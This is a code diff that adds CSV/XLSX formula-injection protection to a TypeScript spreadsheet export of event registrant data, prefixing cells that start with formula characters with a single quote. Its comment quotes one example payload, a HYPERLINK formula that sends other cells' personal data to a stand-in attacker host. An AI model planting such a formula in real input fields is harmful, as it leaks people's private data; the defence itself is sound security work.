@@ -10,6 +10,21 @@
 
 import ExcelJS from "exceljs";
 
+// CSV/XLSX formula-injection defence (security audit M-finding). Cells come from
+// untrusted public input (e.g. a participant's free-text fullName, the registrant
+// email). exceljs writes them as text — not as <f> formulas — but Excel /
+// LibreOffice / Google Sheets re-interpret a cell whose text STARTS with one of
+// = + - @ (or a leading TAB/CR) as a live formula on open or on CSV re-export, so
+// `=HYPERLINK("http://evil/?"&A1,"x")` smuggled into a name could exfiltrate the
+// other (PII) cells when an admin opens the export. Prefix any such string with a
+// single quote — the OWASP-recommended neutraliser — so it's forced to plain text.
+// Applied at this serialization boundary so EVERY column (and any future one) is
+// covered in one place. Numbers pass through untouched.
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
+function neutralize(value: string | number): string | number {
+  return typeof value === "string" && FORMULA_TRIGGER.test(value) ? `'${value}` : value;
+}
+
 // One logical sheet: an optional title (event name), a header row, and data rows.
 export type ExportTable = {
   sheetName: string;
@@ -23,16 +38,16 @@ function addSheet(wb: ExcelJS.Workbook, table: ExportTable): void {
 
   let headerRowIdx = 1;
   if (table.title) {
-    ws.addRow([table.title]);
+    ws.addRow([neutralize(table.title)]);
     ws.getRow(1).font = { bold: true, size: 13 };
     headerRowIdx = 2;
   }
 
-  ws.addRow(table.headers);
+  ws.addRow(table.headers.map(neutralize));
   ws.getRow(headerRowIdx).font = { bold: true };
   ws.views = [{ state: "frozen", ySplit: headerRowIdx }];
 
-  for (const row of table.rows) ws.addRow(row);
+  for (const row of table.rows) ws.addRow(row.map(neutralize));
 
   // Width ≈ longest cell in the column, clamped to a readable range.
   ws.columns.forEach((col, i) => {
